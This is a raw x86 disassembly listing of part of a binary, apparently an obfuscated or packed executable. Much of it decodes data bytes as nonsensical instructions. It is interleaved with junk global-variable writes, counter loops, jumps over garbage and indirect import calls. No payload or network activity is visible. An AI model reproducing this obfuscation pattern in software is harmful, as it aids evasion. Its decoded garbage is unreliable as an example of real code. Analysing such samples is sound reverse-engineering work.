  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483b
  40486f:	xchg   esp,eax
  404870:	mov    eax,ds:0xa3e29c94
  404875:	je     0x4048a4
  404877:	into   
  404878:	lods   al,BYTE PTR ds:[esi]
  404879:	and    BYTE PTR [ecx],al
  40487b:	sbb    edx,DWORD PTR [esi+0x65]
  40487e:	sub    DWORD PTR [ecx],0xffffff96
  404881:	stc    
  404882:	cdq    
  404883:	jmp    0x78e8:0x2f7a975e
  40488a:	pop    ebx
  40488b:	into   
  40488c:	mov    dh,0x20
  40488e:	sbb    BYTE PTR [ebx],dh
  404890:	adc    bh,BYTE PTR [ecx+0x33]
  404893:	lods   eax,DWORD PTR ds:[esi]
  404894:	jmp    0x404828
  404896:	push   esi
  404897:	xchg   ebp,eax
  404898:	add    al,0xe4
  40489a:	adc    eax,0xce0a8262
  40489f:	das    
  4048a0:	dec    esi
  4048a1:	xor    eax,0x376ae610
  4048a6:	dec    esi
  4048a7:	out    dx,al
  4048a8:	and    ebx,edx
  4048aa:	js     0x404837
  4048ac:	adc    bh,dl
  4048ae:	lahf   
  4048af:	cs cdq 
  4048b1:	sti    
  4048b2:	es inc ebp
  4048b4:	or     al,0xec
  4048b6:	or     al,0x3c
  4048b8:	(bad)  
  4048b9:	mov    ah,0xe6
  4048bb:	repz cmp ebx,DWORD PTR [edx-0x4f6c752]
  4048c2:	xor    DWORD PTR [ebp+0x1da8d9c7],0x65
  4048c9:	fnsave [ecx-0x535c77c8]
  4048cf:	fstp   QWORD PTR [eax]
  4048d1:	and    DWORD PTR [ecx],eax
  4048d3:	inc    ebx
  4048d4:	dec    eax
  4048d5:	repnz pop es
  4048d7:	sub    eax,0x1a94297c
  4048dc:	mov    dl,0x99
  4048de:	and    ecx,DWORD PTR [edx]
  4048e0:	pop    edx
  4048e1:	aam    0x59
  4048e3:	stos   DWORD PTR es:[edi],eax
  4048e4:	fnstenv [ebp+ebp*4+0x1c585440]
  4048eb:	or     DWORD PTR [edx-0x2583807e],esp
  4048f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048f2:	and    DWORD PTR [eax-0xb364779],esi
  4048f8:	cwde   
  4048f9:	and    DWORD PTR [esi+eiz*2],edi
  4048fc:	mov    esp,esi
  4048fe:	pop    edx
  4048ff:	popf   
  404900:	mov    dl,0x8b
  404902:	jnp    0x404901
  404904:	lea    ecx,[esi]
  404906:	adc    dh,BYTE PTR [edi]
  404908:	lock ror BYTE PTR ss:[esi],0xc
  40490d:	mov    eax,0xa1f6f3d3
  404912:	cmp    edx,DWORD PTR [ebp+0xb1e9302]
  404918:	sub    eax,0xb41c8570
  40491d:	clc    
  40491e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40491f:	dec    ecx
  404920:	outs   dx,DWORD PTR ds:[esi]
  404921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404922:	jb     0x40490c
  404924:	mov    DWORD PTR [ebp-0x24],0xf89c85d8
  40492b:	mov    eax,DWORD PTR [ebp-0xc]
  40492e:	sbb    DWORD PTR ds:0x417e59,0x417e51
  404938:	xor    eax,esi
  40493a:	sub    DWORD PTR ds:0x41abde,0x4245ba
  404944:	jmp    0x404abd
  404949:	fst    QWORD PTR [ebx]
  40494b:	cdq    
  40494c:	loope  0x4049a7
  40494e:	jns    0x4049a5
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	addr16 mov dl,0x70
  404957:	aam    0xfa
  404959:	fidivr DWORD PTR [edi+0x7e]
  40495c:	jle    0x404938
  40495e:	jg     0x4049de
  404960:	jle    0x40491f
  404962:	sbb    ah,ah
  404964:	rol    DWORD PTR [eax+0x4b83ee1c],0x2c
  40496b:	sub    eax,0xa276375e
  404970:	pusha  
  404971:	xchg   esi,eax
  404972:	(bad)
  404977:	adc    DWORD PTR ds:0xe2c81a0a,0xffffffaa
  40497e:	cli    
  40497f:	adc    BYTE PTR [edx],ch
  404981:	xchg   DWORD PTR [eax-0x38],ebp
  404984:	add    DWORD PTR [edi-0x4b],esp
  404987:	mov    cl,0x80
  404989:	dec    esi
  40498a:	mov    cl,BYTE PTR [esi]
  40498c:	pop    edx
  40498d:	mov    edx,0x9e7d3c2
  404992:	sbb    BYTE PTR [edx],0x68
  404995:	mov    eax,0xf51114a2
  40499a:	nop
  40499b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40499c:	ja     0x4049f1
  40499e:	jo     0x4049b5
  4049a0:	sub    esp,DWORD PTR [eax]
  4049a2:	cmc    
  4049a3:	hlt    
  4049a4:	jg     0x404a08
  4049a6:	dec    ebp
  4049a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049a8:	cs lock xor dh,bh
  4049ac:	fadd   st,st(4)
  4049ae:	and    ch,BYTE PTR [ecx+0x3b]
  4049b1:	imul   edx,DWORD PTR [edx-0x7d],0xfafc8e68
  4049b8:	fisub  DWORD PTR [ecx]
  4049ba:	loope  0x404967
  4049bc:	rcl    BYTE PTR [ebx],cl
  4049be:	add    edi,DWORD PTR ds:0x4c34420b
  4049c4:	mov    ds:0x499e2dd2,eax
  4049c9:	(bad)  
  4049ca:	sbb    bl,BYTE PTR [esi+0x5]
  4049cd:	add    eax,0x271c4673
  4049d2:	cmp    DWORD PTR [eax],0xc8115702
  4049d8:	test   DWORD PTR [edi-0x67],esp
  4049db:	jge    0x4049b5
  4049dd:	pop    eax
  4049de:	pop    edx
  4049df:	loope  0x40497c
  4049e1:	mov    ecx,0x8248cd9
  4049e6:	jmp    0xf807:0x53748caf
  4049ed:	mov    WORD PTR [ecx+0x26f22558],ds
  4049f3:	mov    ch,0x66
  4049f5:	stos   BYTE PTR es:[edi],al
  4049f6:	ins    DWORD PTR es:[edi],dx
  4049f7:	cmp    DWORD PTR [esi+0x3],edi
  4049fa:	iret   
  4049fb:	fdivr  QWORD PTR [edi-0x41]
  4049fe:	std    
  4049ff:	jmp    0x404a7e
  404a01:	adc    edx,esi
  404a03:	clc    
  404a04:	mov    al,ds:0x48380f4a
  404a09:	outs   dx,BYTE PTR ds:[esi]
  404a0a:	jo     0x404a80
  404a0c:	pop    esi
  404a0d:	mov    ch,0x4c
  404a0f:	aaa    
  404a10:	push   ds
  404a11:	cdq    
  404a12:	les    esi,FWORD PTR [eax-0x5f]
  404a15:	mov    bh,0x35
  404a17:	mov    eax,ds:0xc0a74c88
  404a1c:	jg     0x404a49
  404a1e:	ds pop eax
  404a20:	stos   BYTE PTR es:[edi],al
  404a21:	icebp  
  404a22:	call   0x36a053c0
  404a27:	ins    BYTE PTR es:[edi],dx
  404a28:	jge    0x404a1a
  404a2a:	inc    edi
  404a2b:	pushf  
  404a2c:	fiadd  WORD PTR [esp+eax*1-0x197aa8dd]
  404a33:	mov    ah,0xed
  404a35:	push   cs
  404a36:	or     al,BYTE PTR [edx-0x27c03a]
  404a3c:	dec    ecx
  404a3d:	pusha  
  404a3e:	call   0x8356a2e4
  404a43:	popa   
  404a44:	mov    ebp,0x2ac0fe47
  404a49:	es mov ecx,DWORD PTR cs:[esi+0x14]
  404a4e:	fcomp  QWORD PTR [ebp+0x75]
  404a51:	xchg   esp,eax
  404a52:	call   DWORD PTR [edi]
  404a54:	js     0x4049f7
  404a56:	mov    WORD PTR [ecx-0x47],ss
  404a59:	or     eax,0xe7c274f8
  404a5e:	pusha  
  404a5f:	xchg   BYTE PTR [ecx],dl
  404a61:	loopne 0x404a13
  404a63:	shl    DWORD PTR [edx+edi*8],cl
  404a66:	pop    es
  404a67:	sbb    al,0x28
  404a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a6a:	mov    dh,0x59
  404a6c:	aas    
  404a6d:	out    dx,eax
  404a6e:	call   0xfd643837
  404a73:	push   edi
  404a74:	retf   0xb13f
  404a77:	enter  0x21e0,0xea
  404a7b:	jle    0x404ac2
  404a7d:	push   eax
  404a7e:	cs xlat BYTE PTR es:[ebx]
  404a81:	mov    cl,0x5f
  404a83:	add    BYTE PTR [eax-0x13ea89],ch
  404a89:	ins    BYTE PTR es:[edi],dx
  404a8a:	sbb    cl,bl
  404a8c:	sti    
  404a8d:	rol    BYTE PTR [esi],cl
  404a8f:	mov    ds:0x27d5c02f,eax
  404a94:	jg     0x404aae
  404a96:	push   ebx
  404a97:	jp     0x404a71
  404a99:	ins    BYTE PTR es:[edi],dx
  404a9a:	sub    eax,0x5f1c564a
  404a9f:	frstor es:[edi+eiz*2-0xaf4713e]
  404aa7:	push   esi
  404aa8:	mov    dh,0x8
  404aaa:	ds push ebp
  404aac:	pop    esp
  404aad:	jo     0x404a7a
  404aaf:	jne    0x404aeb
  404ab1:	mov    dl,0xf0
  404ab3:	dec    esi
  404ab4:	std    
  404ab5:	cmp    al,0x99
  404ab7:	xchg   ebp,eax
  404ab8:	je     0x404a82
  404aba:	push   eax
  404abb:	mov    al,ah
  404abd:	add    eax,edi
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4245ba,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4245ba
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4245ba,eax
  404adc:	cmp    DWORD PTR ds:0x4245ba,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4245ba,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4245ba,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4245ba
  404b13:	inc    eax
  404b14:	mov    ds:0x4245ba,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4245be,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4245b2,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4245be,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	cld    
  404ba5:	mov    bl,0xc1
  404ba7:	(bad)  
  404ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ba9:	jl     0x404c29
  404bab:	jle    0x404b87
  404bad:	jg     0x404c2d
  404baf:	jle    0x404b7d
  404bb1:	repnz or dh,ch
  404bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bb5:	call   0x83e5:0xce0eb9ac
  404bbc:	pop    es
  404bbd:	idiv   DWORD PTR [ebx+0x52]
  404bc0:	loopne 0x404bf0
  404bc2:	jno    0x404b92
  404bc4:	cwde   
  404bc5:	sbb    DWORD PTR ds:[esi+0xf],0x81c43fcd
  404bcd:	ins    DWORD PTR es:[edi],dx
  404bce:	std    
  404bcf:	fldenv [ecx]
  404bd1:	into   
  404bd2:	dec    ebx
  404bd3:	fstp   TBYTE PTR [esi]
  404bd5:	aas    
  404bd6:	repnz mov BYTE PTR [esi],cl
  404bd9:	std    
  404bda:	loopne 0x404c30
  404bdc:	dec    ebx
  404bdd:	das    
  404bde:	arpl   WORD PTR [edi+0xd],si
  404be1:	aas    
  404be2:	mov    ds:0x5970a951,eax
  404be7:	sub    BYTE PTR [esi-0x7a9387b8],bh
  404bed:	xchg   ecx,eax
  404bee:	gs jecxz 0x404bbb
  404bf1:	sar    BYTE PTR [ebp+0x14355b9e],1
  404bf7:	add    al,0xb7
  404bf9:	sub    BYTE PTR [esi+0x5c],bl
  404bfc:	neg    DWORD PTR [esi+0x67]
  404bff:	retf   0xfb60
  404c02:	jle    0x404be9
  404c04:	das    
  404c05:	push   ss
  404c06:	push   eax
  404c07:	adc    edx,DWORD PTR [ecx-0x54951097]
  404c0d:	or     eax,0x36abfeb3
  404c12:	out    0xbe,al
  404c14:	sub    esi,DWORD PTR [edx-0x4c]
  404c17:	ret    0x5750
  404c1a:	sub    DWORD PTR [ebp+0x3f],esp
  404c1d:	pushf  
  404c1e:	inc    esi
  404c1f:	inc    esp
  404c20:	cmc    
  404c21:	or     DWORD PTR [eax-0x425e5b14],edi
  404c27:	ins    BYTE PTR es:[edi],dx
  404c28:	(bad)  
  404c29:	por    mm5,mm2
  404c2c:	pop    esi
  404c2d:	scas   eax,DWORD PTR es:[edi]
  404c2e:	rcr    DWORD PTR [eax+0x2],0x75
  404c32:	push   es
  404c33:	or     eax,0x971d8cbf
  404c38:	xchg   DWORD PTR [esi+0xe],edi
  404c3b:	test   eax,0x4fe170f9
  404c40:	cld    
  404c41:	cmp    ecx,DWORD PTR [eax]
  404c43:	leave  
  404c44:	test   BYTE PTR ds:0x3f4195ec,ch
  404c4a:	mov    esp,0x61a22db1
  404c4f:	or     al,0x39
  404c51:	fwait
  404c52:	mov    esi,0x9a4e64f6
  404c57:	repz inc ecx
  404c59:	mov    ch,0x87
  404c5b:	mov    eax,ds:0xf3160be
  404c60:	fidivr WORD PTR [ebp-0x6529cb35]
  404c66:	jne    0x404c30
  404c68:	fldenv [ecx-0x29be19ae]
  404c6e:	mov    dl,BYTE PTR [ebp+0x3c]
  404c71:	adc    al,0x5d
  404c73:	iret   
  404c74:	mov    edi,0xb7a4ed33
  404c79:	mov    dl,0xed
  404c7b:	sub    BYTE PTR [eax-0x45e7ac01],ah
  404c81:	xor    ah,BYTE PTR [ebx]
  404c83:	mov    ds:0xe9f385f0,eax
  404c88:	inc    ecx
  404c89:	fadd   QWORD PTR [ebx+0x1b8ffbb0]
  404c8f:	push   0x4f0e80e9
  404c94:	stos   BYTE PTR es:[edi],al
  404c95:	mov    ds:0x72e47c8c,al
  404c9a:	pop    DWORD PTR [ebx-0x79]
  404c9d:	add    BYTE PTR [edx],dh
  404c9f:	pusha  
  404ca0:	inc    ecx
  404ca1:	fistp  WORD PTR [ebx]
  404ca3:	aas    
  404ca4:	fst    DWORD PTR [esi]
  404ca6:	add    al,0x24
  404ca8:	or     eax,0x1b052d68
  404cad:	call   0x3a24:0x43b23226
  404cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cb5:	pop    ss
  404cb6:	stos   BYTE PTR es:[edi],al
  404cb7:	adc    dh,BYTE PTR [eax]
  404cb9:	hlt    
  404cba:	or     eax,0x78e8737b
  404cbf:	ret    
  404cc0:	jbe    0x404d18
  404cc2:	inc    edx
  404cc3:	rcl    DWORD PTR [ebp+eax*1-0x25],cl
  404cc7:	jp     0x404d3d
  404cc9:	push   esp
  404cca:	sbb    ebp,edi
  404ccc:	add    bl,BYTE PTR [ecx-0x60c0d2f4]
  404cd2:	dec    esi
  404cd3:	or     BYTE PTR ds:0x5f84004a,ah
  404cd9:	and    al,0x5e
  404cdb:	jge    0x404d38
  404cdd:	push   ds
  404cde:	push   ecx
  404cdf:	add    al,0xef
  404ce1:	outs   dx,DWORD PTR ds:[esi]
  404ce2:	ja     0x404cdf
  404ce4:	cs fwait
  404ce6:	mov    ch,0x8d
  404ce8:	add    BYTE PTR [ebx+ecx*2-0x5e],dh
  404cec:	and    DWORD PTR [esi-0x9e22bc7],ecx
  404cf2:	and    DWORD PTR [esi],esi
  404cf4:	jmp    0xa3cc:0x4bcb90ae
  404cfb:	fcom   QWORD PTR [ecx]
  404cfd:	ins    BYTE PTR es:[edi],dx
  404cfe:	fild   WORD PTR [esi+0x3]
  404d01:	aas    
  404d02:	add    ch,cl
  404d04:	jo     0x404d06
  404d06:	ja     0x404cb6
  404d08:	int3   
  404d09:	inc    eax
  404d0a:	jecxz  0x404c95
  404d0c:	xor    eax,esi
  404d0e:	neg    DWORD PTR ds:0x415105
  404d14:	add    eax,edi
  404d16:	xor    DWORD PTR ds:0x412364,0x39b1
  404d20:	push   eax
  404d21:	lea    eax,[ebp-0x78]
  404d24:	push   eax
  404d25:	mov    DWORD PTR ds:0x41237c,0x6752
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4245b6,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4245b6,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4245ca
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4245be
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4245ca
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404e11
  404e15:	mov    eax,ds:0x7202ae86
  404e1a:	jle    0x404e9a
  404e1c:	fidivr DWORD PTR [edi+0x7e]
  404e1f:	jle    0x404e1e
  404e21:	mov    ds:0xbae81bc1,al
  404e26:	lock scas al,BYTE PTR es:[edi]
  404e28:	pop    ecx
  404e29:	xor    ch,al
  404e2b:	dec    ecx
  404e2c:	call   0x7beade1c
  404e31:	lock dec ecx
  404e33:	push   esi
  404e34:	ud2    
  404e36:	sbb    DWORD PTR [esp+eax*2+0x76],ebx
  404e3a:	js     0x404e3e
  404e3c:	jge    0x404dda
  404e3e:	inc    edx
  404e3f:	ret    
  404e40:	mov    ah,0xd5
  404e42:	pop    edx
  404e43:	mov    ch,0x49
  404e45:	cdq    
  404e46:	sbb    DWORD PTR [ebx+0x32],esp
  404e49:	js     0x404ebe
  404e4b:	rcr    BYTE PTR es:[eax+eiz*8-0x24],0xc6
  404e51:	aas    
  404e52:	mov    al,0x88
  404e54:	dec    esp
  404e55:	sub    al,0x56
  404e57:	mov    edi,0xf196786c
  404e5c:	add    esp,DWORD PTR ds:0x463d8d65
  404e62:	xor    dh,0xc1
  404e65:	mov    dl,0x4e
  404e67:	mov    ecx,0xcab9e1f9
  404e6c:	mov    dl,0x6
  404e6e:	and    eax,0x536a0aa0
  404e73:	scas   eax,DWORD PTR es:[edi]
  404e74:	cmp    al,0xd
  404e76:	mov    dh,dl
  404e78:	test   bx,bx
  404e7b:	dec    esi
  404e7c:	pop    ebx
  404e7d:	fnstenv fs:[ebp+0x5b]
  404e81:	sbb    BYTE PTR [eax-0x54107977],ch
  404e87:	xor    BYTE PTR [ebx+0x4eb2a03d],ch
  404e8d:	scas   al,BYTE PTR es:[edi]
  404e8e:	mov    edi,0x9d4c2bf3
  404e93:	or     eax,ebx
  404e95:	call   0x283f3270
  404e9a:	popf   
  404e9b:	call   0xa3f5:0x475d727b
  404ea2:	mov    eax,0x24cd0c7f
  404ea7:	mov    dl,0x4a
  404ea9:	test   DWORD PTR [esi+0x36bc56a9],esp
  404eaf:	push   ebx
  404eb0:	mov    dl,0x39
  404eb2:	push   edi
  404eb3:	fld    QWORD PTR [edi-0x32517fb8]
  404eb9:	call   0xa3db:0x36538fa6
  404ec0:	dec    esp
  404ec1:	pop    edi
  404ec2:	aas    
  404ec3:	adc    ah,BYTE PTR [edx+edx*1]
  404ec6:	repz mov dh,0x94
  404ec9:	ret    0x24f8
  404ecc:	fidivr DWORD PTR [ebp-0x5ac46295]
  404ed2:	jmp    0x3146:0x64bad4b
  404ed9:	arpl   WORD PTR [ebx+0x73174539],ax
  404edf:	lahf   
  404ee0:	les    edi,FWORD PTR [edi-0x63d4091f]
  404ee6:	push   ss
  404ee7:	psubusb mm5,mm4
  404eea:	(bad)  
  404eeb:	out    dx,eax
  404eec:	xchg   ebx,eax
  404eed:	add    BYTE PTR [ebp-0x651cdd6a],ch
  404ef3:	ins    DWORD PTR es:[edi],dx
  404ef4:	pop    ebp
  404ef5:	fld    DWORD PTR [ebp-0x54e27d84]
  404efb:	fwait
  404efc:	push   cs
  404efd:	or     DWORD PTR ds:0xff673246,ebx
  404f03:	jmp    0x45f7615b
  404f08:	pop    ecx
  404f09:	push   esp
  404f0a:	into   
  404f0b:	in     eax,dx
  404f0c:	xchg   edi,eax
  404f0d:	sahf   
  404f0e:	(bad)  
  404f10:	jmp    0x9a6:0xf6893a8b
  404f17:	jecxz  0x404f28
  404f19:	adc    ah,BYTE PTR [ebx]
  404f1b:	jp     0x404f41
  404f1d:	mov    esp,0xd957aaf9
  404f22:	xor    bl,dh
  404f24:	mov    edx,0x522bc1ed
  404f29:	bound  edi,QWORD PTR es:[ebx+0x2499d2e6]
  404f30:	mov    al,0x5c
  404f32:	icebp  
  404f33:	inc    eax
  404f34:	cld    
  404f35:	and    ebx,DWORD PTR [ebp-0x6dba1220]
  404f3b:	jmp    0x8b2c:0xaa1439d4
  404f42:	ins    BYTE PTR es:[edi],dx
  404f43:	push   0xffffffe6
  404f45:	jecxz  0x404f63
  404f47:	sub    eax,0x9c094117
  404f4c:	and    BYTE PTR [eax+ecx*4+0x70],bh
  404f50:	push   edx
  404f51:	test   DWORD PTR [edx-0x4394f0a4],esi
  404f57:	aaa    
  404f58:	dec    ebp
  404f59:	mov    ch,0xc
  404f5b:	mov    ebx,0xe03a5264
  404f60:	sbb    ecx,eax
  404f62:	popa   
  404f63:	adc    DWORD PTR [ecx],0x70
  404f66:	jne    0x404f69
  404f68:	pop    esi
  404f69:	mov    dh,0x8a
  404f6b:	jmp    0x404f96
  404f6d:	xchg   ecx,eax
  404f6e:	xchg   ebp,eax
  404f6f:	fiadd  WORD PTR [esi+0xc]
  404f72:	sub    esp,DWORD PTR [esi]
  404f74:	dec    edi
  404f75:	dec    edi
  404f76:	aaa    
  404f77:	ror    DWORD PTR [edx],1
  404f79:	or     DWORD PTR [esi+eiz*8-0x51da7eb0],esp
  404f80:	inc    ebp
  404f81:	inc    edx
  404f82:	add    BYTE PTR [eax],al
  404f84:	add    BYTE PTR [eax],al
  404f86:	add    cl,ch
  404f88:	or     eax,DWORD PTR [eax]
  404f8a:	add    BYTE PTR [eax],al
  404f8c:	mov    eax,ds:0x4245ae
  404f91:	inc    eax
  404f92:	mov    ds:0x4245ae,eax
  404f97:	cmp    DWORD PTR ds:0x4245ae,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4245ae,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx+0x389fa862],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x405031
  404ff9:	mov    ds:0x554d1b94,eax
  404ffe:	jnp    0x404f83
  405000:	sbb    BYTE PTR ds:0xea1ca7fd,dl
  405006:	jl     0x40506f
  405008:	mov    al,ds:0x4139061b
  40500d:	or     esi,0x3d9685f5
  405013:	dec    edx
  405014:	sbb    cl,BYTE PTR [esp+ebx*1]
  405017:	div    dh
  405019:	jbe    0x40500f
  40501b:	fwait
  40501c:	retf   
  40501d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40501e:	and    ebx,DWORD PTR [edx]
  405020:	in     al,0xb5
  405022:	ja     0x404fca
  405024:	mov    DWORD PTR [ecx],ecx
  405026:	mov    bh,0xa6
  405028:	outs   dx,DWORD PTR ds:[esi]
  405029:	fs popa 
  40502b:	outs   dx,DWORD PTR ds:[esi]
  40502c:	mov    cl,0xa1
  40502e:	in     eax,0x8d
  405030:	dec    ebx
  405031:	xlat   BYTE PTR ds:[ebx]
  405032:	push   edi
  405033:	pop    ds
  405034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405035:	ds mov ah,0xb8
  405038:	clc    
  405039:	daa    
  40503a:	push   esi
  40503b:	mov    ecx,0xc72b1657
  405040:	inc    ebp
  405041:	add    BYTE PTR [edx*1+0x5148d188],cl
  405048:	push   es
  405049:	xchg   ebp,eax
  40504a:	add    BYTE PTR [eax+eax*1+0x2d],0xdf
  40504f:	int3   
  405050:	jg     0x40506a
  405052:	repz xor BYTE PTR [esi+0x63b8233e],0xcd
  40505a:	call   0x59bca3dc
  40505f:	neg    dl
  405061:	loop   0x404fe7
  405063:	inc    esp
  405064:	sbb    bl,BYTE PTR [edx+0x12]
  405067:	ins    DWORD PTR es:[edi],dx
  405068:	pop    es
  405069:	dec    ebp
  40506a:	jno    0x40509a
  40506c:	xchg   ebp,esi
  40506e:	fwait
  40506f:	(bad)  
  405070:	mov    esi,0xa3176d57
  405075:	push   esp
  405076:	out    0x9e,eax
  405078:	dec    ebp
  405079:	jo     0x40502c
  40507b:	hlt    
  40507c:	mov    WORD PTR [edi+edi*1],?
  40507f:	sbb    al,0x8c
  405081:	mov    edi,0x4848651
  405086:	and    ebp,DWORD PTR [ebx+esi*4+0x4]
  40508a:	mov    edx,0x230b117
  40508f:	push   ss
  405090:	xor    DWORD PTR [eax],ecx
  405092:	push   esi
  405093:	hlt    
  405094:	repnz dec ebp
  405096:	data16 aaa 
  405098:	or     bh,al
  40509a:	pop    esp
  40509b:	mov    al,ds:0xfab3267b
  4050a0:	adc    esp,esp
  4050a2:	icebp  
  4050a3:	inc    esp
  4050a4:	xchg   DWORD PTR [ebx+0x55],ebx
  4050a7:	push   esi
  4050a8:	mov    edx,0x60dbf1b3
  4050ad:	loopne 0x405059
  4050af:	xchg   BYTE PTR [edi+0x32eaa7b],bh
  4050b5:	popa   
  4050b6:	jnp    0x4050a1
  4050b8:	sub    DWORD PTR [esp+edi*2-0x30],esi
  4050bc:	out    dx,al
  4050bd:	mov    bh,0x2c
  4050bf:	pop    edi
  4050c0:	pop    esp
  4050c1:	loop   0x4050b9
  4050c3:	sti    
  4050c4:	inc    esi
  4050c5:	xor    al,cl
  4050c7:	dec    ecx
  4050c8:	aad    0x5b
  4050ca:	jo     0x405146
  4050cc:	and    al,0xb0
  4050ce:	pop    esp
  4050cf:	cmp    ecx,DWORD PTR [edx+0x18]
  4050d2:	dec    eax
  4050d3:	jnp    0x40511c
  4050d5:	pop    edi
  4050d6:	vrcpss xmm7,xmm1,DWORD PTR [esi+ebx*8+0x2a1e2229]
  4050df:	xchg   ecx,eax
  4050e0:	dec    bl
  4050e2:	cmp    al,0x58
  4050e4:	jns    0x40509c
  4050e6:	mov    al,ds:0x7f8f8511
  4050eb:	push   ebp
  4050ec:	cs out 0xc3,al
  4050ef:	jnp    0x405071
  4050f1:	adc    al,0xe3
  4050f3:	pop    es
  4050f4:	dec    ebx
  4050f5:	sub    BYTE PTR [ebx+0x3f],0xd5
